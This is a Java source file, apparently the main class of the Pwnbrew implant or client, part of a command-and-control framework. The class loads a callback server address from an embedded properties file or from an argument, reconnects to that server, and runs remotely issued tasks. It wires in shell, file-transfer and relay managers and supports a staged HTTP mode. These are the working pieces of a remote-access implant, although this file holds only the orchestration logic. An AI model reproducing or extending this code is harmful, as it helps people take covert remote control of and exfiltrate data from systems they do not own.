/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


package pwnbrew;

import java.io.IOException;
import java.io.InputStream;
import java.net.UnknownHostException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;
import pwnbrew.log.RemoteLog;
import pwnbrew.log.LoggableException;
import pwnbrew.manager.CommManager;
import pwnbrew.manager.DataManager;
import pwnbrew.misc.Constants;
import pwnbrew.misc.DebugPrinter;
import pwnbrew.misc.ManifestProperties;
import pwnbrew.misc.ReconnectTimer;
import pwnbrew.misc.Utilities;
import pwnbrew.network.control.ControlMessageManager;
import pwnbrew.network.control.messages.TaskNew;
import pwnbrew.network.control.messages.TaskStatus;
import pwnbrew.network.file.FileMessageManager;
import pwnbrew.network.http.ClientHttpWrapper;
import pwnbrew.network.http.Http;
import pwnbrew.network.relay.RelayManager;
import pwnbrew.network.shell.ShellMessageManager;
import pwnbrew.task.TaskListener;
import pwnbrew.task.TaskRunner;


/**
 *
 *  
 */
public final class Pwnbrew extends CommManager implements TaskListener {

    private static final String NAME_Class = Pwnbrew.class.getSimpleName();
    private static final boolean debug = false;
  
    //The Server Details
    private final Map<Integer, TaskRunner> theTaskMap = new HashMap<Integer, TaskRunner>();
     
    //===============================================================
    /**
     *  Constructor
    */
    private Pwnbrew( String[] connectStrArr ) throws LoggableException, IOException {
        
        //Make sure the we aren't running already
        DebugPrinter.enable( debug );       
        if( connectStrArr.length == 2 ){

            //Get the control port
            ClientConfig theConf = ClientConfig.getConfig();
            if( theConf == null ){
                throw new RuntimeException("Could not load/create the conf file.");
            }            
            
            theConf.setServerIp(connectStrArr[0]);
            theConf.setSocketPort(connectStrArr[1]);     
        
        } else {
            throw new RuntimeException("Incorrect parameters.");
        }
        
        //Initialize everything
        initialize();

    }

    
    //===============================================================
     /**
     *  Starts the server manager and its associated components.
     *
    */
    private void start() throws UnknownHostException, LoggableException {

        //Try and connect to the server
        ReconnectTimer aReconnectTimer = ReconnectTimer.getReconnectTimer();        
        
        aReconnectTimer.setCommManager( this );
        aReconnectTimer.start();

    }
     
    //===============================================================
    /**
     * Shuts down the control and data com threads
     *
     */
    @Override
    public void shutdown(){

        //Set flag
        try {
            
            super.shutdown();

            //Shutdown the task runners
            synchronized(theTaskMap){
                for( TaskRunner aRunner : theTaskMap.values()){
                    aRunner.shutdown();
                }
            }       

            //Shutdown the managers
            ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
            if( aCMM != null ){
                aCMM.shutdown();
            }

            FileMessageManager aFMM = FileMessageManager.getFileMessageManager();
            if( aFMM != null ){
                aFMM.shutdown();
            }

            ShellMessageManager aSMM = ShellMessageManager.getShellMessageManager();
            if( aSMM != null ){
                aSMM.shutdown();
            }      
            
            RelayManager theRelayManager = RelayManager.getRelayManager();
            if( theRelayManager != null ){
                theRelayManager.shutdown();
            }
            
            //Shut down reconnect timer if it's running
            ReconnectTimer.getReconnectTimer().shutdown();

            //Shutdown debugger
            DebugPrinter.shutdown();

            //Shutdown the executor
            Constants.Executor.shutdownNow();
            
        } catch( IllegalStateException ex ){
        
        }
    }

    //===============================================================
     /**
     * Notifies the task handler that a file was successfully sent
     *
     * @param taskId the task id
     * @param fileOp the kind of file notification
      *
    */
    @Override
    public void notifyHandler( int taskId, int fileOp ) {

       TaskRunner theTaskRunner;
       synchronized(theTaskMap){
          theTaskRunner = theTaskMap.get(taskId);
       }

       //Notify the task runner thread
       if(theTaskRunner != null){
          theTaskRunner.notifyFileOp(fileOp);
       }
    }

     /**
     * @param args the command line arguments
     * @throws java.lang.Throwable
     */
    public static void main(String[] args) throws Throwable {
        
        try {
            
            String[] inputArr = new String[0];
            if( args.length == 0 ){
                
                ManifestProperties localProperties = new ManifestProperties();
                Class localClass = Pwnbrew.class;
                InputStream localInputStream = localClass.getResourceAsStream("/" + Constants.PROP_FILE);
                if (localInputStream != null) {
                    localProperties.load(localInputStream);
                    localInputStream.close();
                }

                //Get ip
                String ip = localProperties.getProperty(Constants.SERV_LABEL);
                if( ip == null ){
                    return;
                }

                //Get control
                String thePort = localProperties.getProperty(Constants.PORT_LABEL);
                if( thePort == null ){
                    return;
                }

                inputArr = new String[]{ ip, thePort };
            
            } else {
                
                String httpsStr = "https://";
                //Get the connect string
                String connectStr = args[0];
                if( connectStr.contains(httpsStr)){
                    String[] connectArr = connectStr.replace(httpsStr, "").replace("/", "").trim().split(":");
                    if( connectArr.length > 1 ){
                        inputArr = new String[]{ connectArr[0], connectArr[1]};
                    }
                }
                
            }
        
            //Parse the command line args
            if( inputArr.length > 0 ){
               
                //Instantiate the manager and start it up
                Pwnbrew entryPoint = new Pwnbrew( inputArr );
                entryPoint.start();

                return;
            
            }
            
            System.out.println("Incorrect parameters.");

        } catch (Throwable ex) {
           
            ex.printStackTrace();
            DebugPrinter.shutdown();
            Constants.Executor.shutdownNow();
            RemoteLog.log(Level.WARNING, NAME_Class, "main()", ex.getMessage(), ex);
            throw ex;
           
        } 

    }

    //===============================================================
    /**
     * Adds a task runner to the map
     *
     * @param passedId
     * @param passedRunner
    */
    private TaskRunner addTaskRunner(Integer passedId, TaskRunner passedRunner){
        synchronized(theTaskMap){
           return theTaskMap.put(passedId, passedRunner);
        }
    }

    //===============================================================
    /**
     * Returns the task handler for the specified id
     *
     * @param passedId
    */
    private TaskRunner getTaskRunner(Integer passedId){
        TaskRunner theTaskRunner;
        synchronized(theTaskMap){
           theTaskRunner = theTaskMap.get(passedId);
        }
        return theTaskRunner;
    }

    //===============================================================
    /**
    * Handles the task changes
    *
    */
    @Override
    public void taskChanged(TaskStatus passedMsg) {

        int taskId = passedMsg.getTaskId();

        String taskStatus = passedMsg.getStatus();
        if(taskStatus.equals( TaskStatus.TASK_START) && passedMsg instanceof TaskNew){

            TaskRunner theTaskRunner = getTaskRunner(Integer.valueOf(taskId));
            if( theTaskRunner == null){
                
                //Create a new task runner, add it to the map, and execute it
                TaskNew newTask = (TaskNew)passedMsg;
                TaskRunner aHandler = new TaskRunner(this, newTask);
                addTaskRunner(taskId, aHandler);

                //Execute the runnable
                aHandler.start();
            }

        //If a msg was received to cancel the task
        } else if (taskStatus.equals( TaskStatus.TASK_CANCELLED)){

            TaskRunner theTaskRunner = getTaskRunner(Integer.valueOf(taskId));
            //Shutdown the runner
            if(theTaskRunner != null){
                theTaskRunner.shutdown();
            }
            
            //Get the file manager
            try {
                
                FileMessageManager theFileMM = FileMessageManager.getFileMessageManager();
                if( theFileMM == null ){
                    theFileMM = FileMessageManager.initialize( this );
                } 
                theFileMM.cancelFileTransfer( taskId ); 
                
            } catch( IOException ex ){
                RemoteLog.log(Level.WARNING, NAME_Class, "taskChanged()", ex.getMessage(), ex);
            } catch( LoggableException ex ){
                RemoteLog.log(Level.WARNING, NAME_Class, "taskChanged()", ex.getMessage(), ex);
            }
            
            
           
        }

    }

    //===============================================================
    /**
     * Handles the completion of a task
     *
     * @param taskId
     * @param resultStatus
    */
    @Override
    public void taskFinished(Integer taskId, String resultStatus ) {
        
     
        //Send out task fin
        DebugPrinter.printMessage( this.getClass().getSimpleName(), "Sent task finish for " + taskId);

        try {
            
            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
            if( aCMManager == null ){
                aCMManager = ControlMessageManager.initialize( this );
            }
            
            TaskStatus finMessage = new TaskStatus( taskId, resultStatus );
            aCMManager.send(finMessage);
            
        } catch (IOException ex ){
           RemoteLog.log(Level.SEVERE, NAME_Class, "taskFinished()", ex.getMessage(), ex);
        } catch (LoggableException ex ){
           RemoteLog.log(Level.SEVERE, NAME_Class, "taskFinished()", ex.getMessage(), ex);
        }

    }

    //===============================================================
    /**
    *   Executes the Runnable.
    *
     * @param command
    */
    public void execute(Runnable command) {
        Constants.Executor.execute(command);
    }
  
    // ========================================================================
    /**
     * Returns the Comm Manager
     * @return 
    */
    public CommManager getCommManager() {
        return this;
    }
    
    // ========================================================================
    /**
     *  Handles any functions that need to be executed before the program starts.
     * @throws pwnbrew.log.LoggableException
     */
    public void initialize() throws LoggableException {

        //Get the port
        int thePort = ClientConfig.getConfig().getSocketPort();        
        
        //Create and set the http wrapper
        if( Utilities.isStaged() ){
            //Has to use http because the stager is currently http
            ClientHttpWrapper aWrapper = new ClientHttpWrapper();
            DataManager.setPortWrapper( thePort, aWrapper); 
            
        } else {
        
            //Switch based on the port
            switch( thePort ){
                case Http.DEFAULT_PORT:
                case Http.SECURE_PORT:
                    ClientHttpWrapper aWrapper = new ClientHttpWrapper();
                    DataManager.setPortWrapper( thePort, aWrapper);
                    break;
            }
        }
        
             
    }    
    
}/* END CLASS Pwnbrew */
